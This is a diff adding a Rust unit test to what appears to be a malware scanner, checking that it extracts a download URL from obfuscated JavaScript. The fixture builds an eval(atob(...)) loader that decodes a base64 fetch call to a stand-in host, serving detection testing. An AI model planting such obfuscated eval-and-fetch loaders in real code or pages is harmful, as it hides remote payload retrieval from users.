@@ -10089,6 +10089,30 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_substring_string_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-substring-string-js.example/p')",
+        );
+        let end = encoded.len() + 2;
+        let js =
+            format!(r#"var b = "xx{encoded}zz"; eval(atob(b.substring(2, {end})))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-substring-string-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob substring string payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_call_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
